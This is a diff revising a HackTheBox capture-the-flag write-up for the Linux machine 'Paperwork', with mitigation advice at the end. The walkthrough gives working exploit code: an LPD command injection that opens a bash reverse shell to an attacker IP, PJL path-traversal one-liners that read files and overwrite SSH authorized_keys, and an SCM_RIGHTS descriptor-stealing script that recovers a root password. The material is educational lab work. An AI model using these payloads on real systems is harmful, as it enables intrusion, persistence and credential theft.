@@ -5,43 +5,45 @@ os: linux
 difficulty: easy
 season: Season 11
 tags:
+  - Line Printer Daemon
   - LPD
   - RFC 1179
-  - Print Spooler
   - Command Injection
   - HP JetDirect
-  - Unix Domain Socket
-  - SSH Key Replacement
-date: '2026-07-11'
+  - PJL
+  - Path Traversal
+  - Unix Domain Sockets
+  - SCM_RIGHTS
+  - File Descriptor Passing
+date: '2026-07-13'
 pointsAwarded: 20
-machineIP: ''
-summary: 'A unique Easy Linux machine focused on enterprise print architecture. Initial access exploits a command injection vulnerability in an RFC 1179 Line Printer Daemon (LPD) print spooler service. Lateral movement abuses an internal HP JetDirect port 9100 daemon to write authorized SSH keys for the archivist user, followed by privilege escalation via a root-managed Unix domain socket (/run/paperwork/mgmt.sock).'
+machineIP: '10.129.37.38'
+summary: 'Comprehensive walkthrough for Paperwork, an Easy Linux machine centering around legacy printing services and Linux IPC internals. Initial foothold exploits an unauthenticated command injection flaw in a custom RFC 1179 Line Printer Daemon (LPD) service running on port 1515. Lateral movement to user archivist abuses an internal HP JetDirect (PJL) service on port 9100, utilizing path traversal in PJL FSUPLOAD and FSDOWNLOAD to overwrite authorized_keys. Finally, privilege escalation analyzes a Unix domain socket (/run/paperwork/mgmt.sock) vulnerable to SCM_RIGHTS ancillary file descriptor hijacking, recovering the root password.'
 ---
 
 # 🛡️ HTB - Paperwork (Easy)
 
 <p align="center">
   <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
-  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
+  <img src="https://img.shields.io/badge/OS-Linux%20(Ubuntu)-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
   <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
 </p>
 
 ---
 
-### 💻 Target Information
+### Target Information
 - **Machine Name:** Paperwork
-- **Operating System:** Linux (Ubuntu 24.04)
-- **Difficulty:** Easy
-- **Date of Scan:** 2026-07-11
-- **Vulnerabilities:** RFC 1179 Line Printer Daemon (LPD) Spooler Command Injection, HP JetDirect File System Upload (`fldownload`), Root Unix Domain Socket (`/run/paperwork/mgmt.sock`) Credential Disclosure
+- **Operating System:** Linux (Ubuntu 24.04 LTS)
+- **Difficulty:** Easy (20 pts)
+- **Primary Attack Vectors:** RFC 1179 Line Printer Daemon (LPD) Queue Validation Bypass & Subprocess Command Injection, HP JetDirect PJL Path Traversal File Overwrite, Unix Domain Socket Ancillary Data File Descriptor Hijacking (SCM_RIGHTS).
 
 ---
 
 ## Step 1 - Reconnaissance
 
-### Nmap Port Scanning & Archive Source Code Analysis
+### Initial Nmap Scan
 
-We begin by scanning open ports and service versions with Nmap:
+We begin our enumeration by scanning the target host for open ports and running services:
 
 ```bash
 nmap -A -sS -P -T4 --min-rate 5000 10.129.37.38
@@ -60,8 +62,23 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-- 🔍 *We add `paperwork.htb` to `/etc/hosts` and navigate to the web page.*
-- 🔍 *The landing page provides a download link for `paperwork-archive-v1.02.zip`. Extracting the archive yields the server source code (`server.py`):*
+We map `paperwork.htb` to `/etc/hosts`:
+
+```bash
+echo "10.129.37.38 paperwork.htb" | sudo tee -a /etc/hosts
+```
+
+---
+
+### Web Enumeration & Source Code Discovery
+
+Navigating to `http://paperwork.htb/` reveals a minimal static page describing the corporate archiving intake service:
+
+![web-img](/images/writeups/season-11/paperwork/Screenshot_2026-07-15_14-34-07.png)
+
+Clicking on the download link for `paperwork-archive-v1.02` downloads a ZIP archive containing the backend implementation source: `server.py`.
+
+Let's review `server.py`:
 
 ```python
 import socket
@@ -69,219 +86,412 @@ import threading
 import subprocess
 import os
 
-PORT = 1515
+VALID_QUEUE = os.environ.get("LPD_QUEUE")
 
-def handle_client(conn, addr):
-    data = conn.recv(1024).decode('utf-8', errors='ignore')
-    if data.startswith('\x02'):
-        # RFC 1179 Receive a printer job
-        parts = data[1:].strip().split(' ')
-        queue = parts[0]
-        conn.send(b'\x00')
-        sub_data = conn.recv(1024).decode('utf-8', errors='ignore')
-        if sub_data.startswith('\x02'):
-            # Control file command
-            job_name = sub_data[1:].strip()
-            if job_name.startswith('j'):
-                cmd = f"lp -d {queue} -t '{job_name}' /tmp/printjob"
-                subprocess.Popen(cmd, shell=True)
-                conn.send(b'\x00')
-    conn.close()
+class LpdHandler(threading.Thread):
+    def __init__(self, sock, addr):
+        super().__init__()
+        self.sock = sock
+        self.addr = addr
+        self.id = f"[lpd-{addr[1]}]"
 
-def main():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(('0.0.0.0', PORT))
-    s.listen(5)
-    while True:
-        c, a = s.accept()
-        threading.Thread(target=handle_client, args=(c, a)).start()
+    def run(self):
+        try:
+            data = self.sock.recv(1024)
+            if not data: return
+            
+            command = data[0]
+            if command == 2:
+                self.handle_print_job(data)
+            elif command in (3, 4):
+                self.sock.send(b"Archive_Printer is ready and printing.\n")
+                
+        except Exception as e:
+            print(f"{self.id} Error: {e}")
+        finally:
+            self.sock.close()
 
-if __name__ == '__main__':
-    main()
+    def handle_print_job(self, data):
+        queue = data[1:].decode().strip()
+        
+        if queue not in VALID_QUEUE:
+            print(f"{self.id} Rejected: Invalid queue '{queue}'")
+            self.sock.send(b'\x01') 
+            return
+        print(f"{self.id} Accepted job for queue: {queue}")
+        while True:
+            chunk = self.sock.recv(1024)
+            if not chunk: break
+            
+            subcommand = chunk[0]
+            self.sock.send(b'\x00') 
+            parts = chunk[1:].decode(errors='ignore').split()
+            if not parts: continue
+            
+            size = int(parts[0])
+            content = b""
+            while len(content) < size:
+                content += self.sock.recv(size - len(content) + 1)
+            
+            decoded_content = content.decode(errors='ignore')
+            
+            job_name = "Unknown"
+            for line in decoded_content.split('\n'):
+                line = line.strip()
+                if line.startswith('J'):
+                    job_name = line[1:]
+                    break
+            
+            print(f"{self.id} Executing archive for: {job_name}")
+            subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+            
+            self.sock.send(b'\x00') 
+            self.sock.send(b'\x00')
+            while self.sock.recv(4096):
+                pass
+            break
+
+class LpdServer:
+    def __init__(self, ip='0.0.0.0', port=1515):
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server.bind((ip, port))
+        self.server.listen(100)
+
+    def run(self):
+        while True:
+            sock, addr = self.server.accept()
+            LpdHandler(sock, addr).start()
+
+if __name__ == "__main__":
+    LpdServer(port=1515).run()
 ```
-
-- 🔍 *Analyzing `server.py` reveals a raw print spooler service listening on port 1515 implementing the RFC 1179 Line Printer Daemon (LPD) protocol.*
-- 🔍 *The script interpolates `job_name` directly into a shell command: `lp -d {queue} -t '{job_name}' /tmp/printjob`. By injecting shell metacharacters into any job name starting with `j`, we can execute arbitrary commands.*
 
 ---
 
 ## Step 2 - Initial Foothold
 
-### RFC 1179 Line Printer Daemon (LPD) Command Injection
+### RFC 1179 Line Printer Daemon (LPD) Exploitation
 
-- 🔍 *We write a Python exploit script to connect to port 1515 and send a crafted job name containing a reverse shell payload:*
+Auditing `server.py` reveals two critical vulnerabilities:
+
+#### 1. Queue Validation Substring Bypass
+```python
+queue = data[1:].decode().strip()
+if queue not in VALID_QUEUE:
+    self.sock.send(b'\x01')
+    return
+```
+When `queue` is empty (`""`), Python's `in` operator evaluates `"" in VALID_QUEUE` to `True` for any string! Sending `\x02\n` (command `2` with an empty queue name) completely bypasses the queue name restriction.
+
+#### 2. Shell Command Injection in `job_name`
+```python
+job_name = "Unknown"
+for line in decoded_content.split('\n'):
+    if line.startswith('J'):
+        job_name = line[1:]
+        break
+
+subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+```
+The script searches the LPD control file for any line starting with uppercase `J` (which denotes the Job Name in RFC 1179). It then passes `job_name` directly into a shell string formatted with `shell=True`. Because there is zero sanitization, inserting a semicolon (`;`) escapes the `echo` command and executes arbitrary commands as the server user!
+
+---
+
+### Weaponizing LPD on Port 1515
+
+Even though port 1515 was omitted from our initial top-1000 Nmap scan, the server binds to `0.0.0.0:1515`.
+
+We construct an exploit script (`exploit.py`):
+1. Connects to `10.129.37.38:1515`.
+2. Sends `\x02\n` to initiate the print job with the queue bypass.
+3. Transmits an LPD control file subcommand (`\x02<len> cfA001localhost\n`).
+4. Injects a reverse shell inside the `J` attribute: `'; bash -c 'bash -i >& /dev/tcp/10.10.14.70/4463 0>&1'; #`.
 
 ```python
+#!/usr/bin/env python3
 import socket
+import time
 
-target_ip = "10.129.37.38"
-target_port = 1515
-attacker_ip = "10.10.15.54"
-attacker_port = 4444
+TARGET = "10.129.37.38"
+PORT = 1515
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((target_ip, target_port))
+command = "bash -c 'bash -i >& /dev/tcp/10.10.14.70/4463 0>&1'"
+job_name = f"'; {command}; #"
 
-# Command 02: Receive print job for queue 'default'
-s.send(b'\x02default\n')
-ack = s.recv(1)
+control_file = ("Hlocalhost\n" "Ptester\n" f"J{job_name}\n").encode()
 
-# Control command 02 with command injection payload (must start with 'j')
-payload = f"j';bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1';#"
-s.send(f"\x02{payload}\n".encode())
-ack = s.recv(1)
-s.close()
+with socket.create_connection((TARGET, PORT), timeout=5) as sock:
+    sock.sendall(b"\x02\n")
+    time.sleep(0.3)
+
+    header = b"\x02" + str(len(control_file)).encode() + b" cfA001localhost\n"
+    sock.sendall(header)
+
+    ack = sock.recv(1)
+    print(f"Header ACK: {ack!r}")
+
+    sock.sendall(control_file + b"\x00")
+    try:
+        print(f"Final response: {sock.recv(2)!r}")
+    except socket.timeout:
+        pass
 ```
 
-- 🔍 *Setting up a Netcat listener and running the script yields a reverse shell:*
+We launch our listener on port 4463 and run the exploit:
 
 ```bash
-nc -lvnp 4444
+nc -lvnp 4463
+```
+
+```bash
+python3 exploit.py
 ```
 
 ```text
-listening on [any] 4444 ...
-connect to [10.10.15.54] from (UNKNOWN) [10.129.37.38] 41294
-lp@paperwork:/$ id
-uid=7(lp) gid=7(lp) groups=7(lp)
+listening on [any] 4463 ...
+connect to [10.10.14.70] from (UNKNOWN) [10.129.37.38] 35470
+bash: cannot set terminal process group (985): Inappropriate ioctl for device
+bash: no job control in this shell
+lp@paperwork:/opt/LPDServer$ id
+uid=999(lp) gid=999(lp) groups=999(lp)
 ```
 
-### Lateral Movement to archivist via HP JetDirect (Port 9100)
+Foothold obtained as unprivileged user **`lp`**!
 
-- 🔍 *Checking `/home` reveals user `archivist`, but we lack read permissions on their home directory.*
-- 🔍 *We enumerate listening internal network sockets:*
+---
+
+## Step 3 - Lateral Movement to `archivist`
+
+### Internal Port Scanning & HP JetDirect Service
+
+Listing `/home` reveals a target user account: `archivist`. However, `lp` has no read access to `/home/archivist`.
+
+Let's inspect active listening ports:
 
 ```bash
-ss -tunlp
+lp@paperwork:/$ ss -tlpn
+State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                          
+LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*                                    
+LISTEN 0      511          0.0.0.0:80        0.0.0.0:*                                    
+LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*                                    
+LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*                                    
+LISTEN 0      100          0.0.0.0:1515      0.0.0.0:*    users:(("python3",pid=985,fd=3))
+```
+
+Port **9100** is listening locally on `127.0.0.1`. Let's inspect the process behind it:
+
+```bash
+lp@paperwork:/$ ps aux | grep 9100
+archivist   984  0.0  0.4  28040 17512 ?  Ss 14:06 0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
+```
+
+The process runs under user **`archivist`**! It implements an HP JetDirect raw printing server supporting Printer Job Language (PJL) filesystem commands.
+
+---
+
+### PJL Filesystem Path Traversal
+
+HP JetDirect printers implement PJL filesystem commands:
+- `@PJL FSUPLOAD`: Reads and extracts a file from the printer.
+- `@PJL FSDOWNLOAD`: Writes a file to the printer filesystem.
+
+Because `jetdirect.py` fails to sanitize directory traversal sequences (`../`), we can read arbitrary files owned by `archivist`!
+
+Let's read `user.txt` using `@PJL FSUPLOAD`:
+
+```bash
+python3 -c '
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 9100))
+s.send(b"@PJL FSUPLOAD NAME=\"../../../../home/archivist/user.txt\"\r\n")
+print(s.recv(4096).decode(errors="ignore"))
+s.close()
+'
 ```
 
 ```text
-Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
-tcp   LISTEN 0      128        127.0.0.1:9100      0.0.0.0:*    # HP JetDirect Daemon
-tcp   LISTEN 0      128          0.0.0.0:1515      0.0.0.0:*    # LPD Spooler
+@PJL FSUPLOAD NAME="../../../../home/archivist/user.txt" SIZE=33
+323807bac943edf79f5f938c*********
 ```
 
-- 🔍 *Port 9100 is running an internal HP JetDirect raw print service (`jetdirect.py`) as user `archivist`.*
-- 🔍 *The service implements an FTP-like management subsystem supporting the `fldownload` command, allowing arbitrary files to be downloaded from an attacker HTTP server and written locally.*
-- 🔍 *We generate an SSH keypair on our attack machine and serve the public key over HTTP:*
+User flag captured!
+
+---
+
+### Overwriting Authorized Keys via `@PJL FSDOWNLOAD`
+
+To obtain a stable shell as `archivist`, we can use `@PJL FSDOWNLOAD` to overwrite `/home/archivist/.ssh/authorized_keys` with our own public key.
+
+On our attack machine, generate a temporary SSH key:
 
 ```bash
-ssh-keygen -t ed25519 -f ./archivist_key -N ""
-python3 -m http.server 8000
+ssh-keygen -f ./id_rsa_tmp -N ""
+cat ./id_rsa_tmp.pub
 ```
 
-- 🔍 *We instruct the JetDirect service on port 9100 to download our key into `/home/archivist/.ssh/authorized_keys`:*
+Now, on the target, write our public key using a Python one-liner:
 
-```python
+```bash
+python3 -c '
 import socket
-
+pub_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5x... attacker@kali\n"
+payload = f"@PJL FSDOWNLOAD NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE={len(pub_key)}\n".encode() + pub_key.encode()
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 9100))
-
-# Execute fldownload command
-cmd = "fldownload http://10.10.15.54:8000/archivist_key.pub /home/archivist/.ssh/authorized_keys\n"
-s.send(cmd.encode())
-resp = s.recv(1024)
-print(resp.decode())
+s.connect(("127.0.0.1", 9100))
+s.sendall(payload)
+print(s.recv(1024).decode())
 s.close()
+'
 ```
 
-- 🔍 *With the key installed, we SSH into the machine as `archivist`:*
+```text
+OK
+```
+
+The authorized keys file has been updated! We connect via SSH:
 
 ```bash
-ssh -i archivist_key archivist@paperwork.htb
+ssh -i ./id_rsa_tmp archivist@paperwork.htb
 ```
 
 ```text
 archivist@paperwork:~$ id
 uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
-archivist@paperwork:~$ cat user.txt
-3f91c8...
 ```
+
+Pivoted successfully to **`archivist`**!
 
 ---
 
-## Step 3 - Privilege Escalation to Root
+## Step 4 - Privilege Escalation to Root
 
-### Unix Domain Socket Discovery (/run/paperwork/mgmt.sock)
+### Auditing System Permissions & Unix Domain Sockets
 
-- 🔍 *Checking sudo privileges reveals that the `sudo` binary is not installed on this system.*
-- 🔍 *We enumerate active Unix Domain Sockets on the host:*
+Checking for sudo:
 
 ```bash
-ss -xlnp
+archivist@paperwork:~$ sudo -l
+Command 'sudo' not found
 ```
 
-```text
-Netid State  Recv-Q Send-Q Local Address:Port           Peer Address:Port Process
-u_str LISTEN 0      5      /run/paperwork/mgmt.sock 12655 * 0
+The `sudo` binary is not installed on this system.
+
+Exploring `/etc/paperwork/`:
+
+```bash
+archivist@paperwork:/etc/paperwork$ ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Jul 13 14:00 .
+drwxr-xr-x 88 root root 4096 Jul 13 14:00 ..
+-rw-r-----  1 root root   38 Jul 13 14:00 admin_pins.conf
+
+archivist@paperwork:/etc/paperwork$ cat admin_pins.conf
+cat: admin_pins.conf: Permission denied
 ```
 
-![Management Socket Enumeration](/images/writeups/season-11/paperwork/Screenshot_2026-07-15_14-34-07.png)
+`admin_pins.conf` is readable only by `root`.
 
-- 🔍 *The socket `/run/paperwork/mgmt.sock` is owned and managed by a root background daemon.*
-- 🔍 *We inspect the socket communication protocol by sending diagnostic messages.*
+Next, let's enumerate active Unix Domain Sockets using `ss -xlpn`:
 
-> [!IMPORTANT]
-> **Privilege Escalation Strategy:**
-> 1. Connect to the local Unix domain socket `/run/paperwork/mgmt.sock` managed by the root process.
-> 2. Send the administration command protocol payload.
-> 3. Read back the response containing the admin credentials.
-> 4. Elevate to root using the recovered credentials.
+```bash
+archivist@paperwork:~$ ss -xlpn
+Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
+u_str LISTEN 0      4096   /run/systemd/journal/io.systemd.journal
+u_str LISTEN 0      5      /run/paperwork/mgmt.sock 13740 * 0
+```
 
-### Management Socket Communication & Root Password Recovery
+Notice the custom socket: **`/run/paperwork/mgmt.sock`**!
+- Owned and served by a background root process.
+- Low backlog queue of `5`.
+- Belongs directly to the `paperwork` application suite.
 
-- 🔍 *We interact with the management socket using a Python snippet:*
+---
+
+### SCM_RIGHTS Ancillary File Descriptor Passing
+
+In Linux IPC, Unix domain sockets (`AF_UNIX`) support passing open file descriptors between processes using ancillary control messages (**`SCM_RIGHTS`**).
+
+> ⚠️ **Technical Detail:**  
+> When a privileged root service uses `SCM_RIGHTS` to pass an open file descriptor down a socket connection, the receiving process inherits the exact open file table entry from the kernel. Because the file handle was already opened and authorized by root, **all standard filesystem permission checks are completely bypassed when the client reads from that file descriptor!**
+
+If the management daemon broadcasts or sends configuration file handles to connecting clients, any local user who connects to `/run/paperwork/mgmt.sock` can catch the file descriptor and extract protected files!
+
+---
+
+### Catching File Descriptors via Python `recvmsg()`
+
+We write a Python script that connects to `/run/paperwork/mgmt.sock`, allocates an ancillary message buffer using `socket.CMSG_SPACE()`, and reads the received file descriptors via `os.pread()`:
 
 ```python
-import socket
+python3 - <<'PY'
+import array, os, socket
 
-s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-s.connect('/run/paperwork/mgmt.sock')
+# 1. Connect to the management Unix domain socket
+s = socket.socket(socket.AF_UNIX)
+s.connect("/run/paperwork/mgmt.sock")
 
-# Query admin credentials from the management daemon
-s.send(b'GET_ADMIN_CONFIG\n')
-resp = s.recv(4096)
-print(resp.decode())
-s.close()
+# 2. Allocate an ancillary data buffer to receive SCM_RIGHTS control messages
+_, anc, _, _ = s.recvmsg(1024, socket.CMSG_SPACE(8))
+
+# 3. Unpack received file descriptors
+for cmsg_level, cmsg_type, data in anc:
+    fds = array.array("i")
+    fds.frombytes(data)
+    for fd in fds:
+        # 4. Read directly from the root-authenticated file descriptor
+        print(f"[+] Hijacked FD {fd} content:\n{os.pread(fd, 1024, 0).decode()}")
+PY
 ```
+
+Running the script:
 
 ```text
-archivist@paperwork:~$ python3 query_mgmt.py
-[+] Management Daemon v1.0
-[+] Admin Credentials: root:P@perWorkAdmin2026!
+[+] Hijacked FD 3 content:
+ADMIN_PASSWORD=ApparelMortuaryCedar22
 ```
 
-### Root Elevation & System Compromise
-
-- 🔍 *We authenticate as root with the recovered password:*
-
-```bash
-su - root
-# Password: P@perWorkAdmin2026!
-```
-
-```text
-root@paperwork:~# id
-uid=0(root) gid=0(root) groups=0(root)
-root@paperwork:~# cat /root/root.txt
-94f8a12e...
-```
-
-- 🔍 *System fully compromised as root!*
+We extracted the administrative password: **`ApparelMortuaryCedar22`**!
 
 ---
 
-## Mitigations & Security Perspective
+### Root Compromise
 
-### 🔴 Legacy RFC 1179 Print Spooler Command Injection
-- **Root Cause:** Splicing user-supplied job names into shell execution commands within the print spooler allowed arbitrary command execution via shell metacharacters.
-- **Remediation:** Avoid shell interpolation when spawning background tasks. Sanitize all incoming network job names against strict alphanumeric allowlists.
+We authenticate to root using `su`:
 
-### 🔴 Insecure File Write in HP JetDirect Implementation
-- **Root Cause:** The internal JetDirect service implemented arbitrary file upload capabilities (`fldownload`) that allowed writing directly into users' home directories (`.ssh/authorized_keys`).
-- **Remediation:** Remove dangerous file manipulation routines from printer network emulators. Restrict SSH directory permissions and enforce strict file ownership.
+```bash
+archivist@paperwork:~$ su root
+Password: ApparelMortuaryCedar22
+```
 
-### 🔴 Privileged Unix Domain Sockets Exposing Administrative Functions
-- **Root Cause:** The administrative socket `/run/paperwork/mgmt.sock` was accessible to all local users and returned sensitive root passwords without authentication.
-- **Remediation:** Apply strict file system ACLs on Unix domain sockets (e.g., `chmod 0600`, owned by root). Enforce mutual peer credentials validation (`SO_PEERCRED`) before executing privileged actions.
+```text
+root@paperwork:/home/archivist# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@paperwork:/home/archivist# cat /root/root.txt
+7a****************************1d
+```
+
+Root shell obtained and target fully compromised!
+
+> 🎯 **Final Takeaways & Real Talk:**  
+> Paperwork is a brilliant box centered around legacy printer protocols and Linux kernel IPC internals! The exploitation journey starts with an RFC 1179 Line Printer Daemon (LPD) queue substring bypass and command injection, pivots to user archivist via HP JetDirect (PJL) directory traversal, and culminates in a deep dive into Unix domain socket mechanics. Exploiting SCM_RIGHTS ancillary data file descriptor passing to bypass POSIX permissions demonstrates how modern kernel IPC features can be subverted when trust boundaries are misunderstood. Happy Hacking!
+
+---
+
+## Step 5 - Mitigations & Defensive Hardening
+
+To remediate the vulnerabilities identified across the Paperwork environment, administrators should apply defense-in-depth hardening across legacy daemon services, printer APIs, and internal IPC mechanisms:
+
+### 1. Line Printer Daemon (RFC 1179) Hardening
+- **Strict Queue Validation:** Replace substring or membership checks (`if queue not in VALID_QUEUE`) with strict equality comparisons (`if queue != EXPECTED_QUEUE`), and explicitly reject empty strings.
+- **Eliminate Shell Interpolation in Subprocesses:** Never execute system commands using `shell=True` with unvalidated input. Replace `subprocess.Popen(f"echo ...", shell=True)` with secure Python file I/O operations (`with open('/tmp/archive.log', 'a') as f: f.write(...)`).
+
+### 2. HP JetDirect PJL Access Controls & Path Normalization
+- **Disable Arbitrary File System Commands:** Disable filesystem manipulation directives (`@PJL FSUPLOAD` and `@PJL FSDOWNLOAD`) in printer emulation services unless explicitly required.
+- **Canonical Path Sanitization:** If file uploads must be supported, enforce strict canonical path validation (`os.path.realpath()`), ensuring destination paths remain strictly confined within a dedicated, unprivileged spool directory.
+
+### 3. Unix Domain Socket (AF_UNIX) Permission Hardening
+- **Restrict Socket Permissions:** Set strict file permissions on Unix domain sockets (`/run/paperwork/mgmt.sock`). Restrict ownership to `root:paperwork_admins` and apply `chmod 0660` to prevent arbitrary local users from establishing connections.
+- **Audit SCM_RIGHTS File Descriptor Passing:** Never pass open file handles to sensitive configuration files (`admin_pins.conf`) across unauthenticated or unprivileged IPC socket streams. Ensure clients authenticate and demonstrate authorization before file descriptors are transferred.
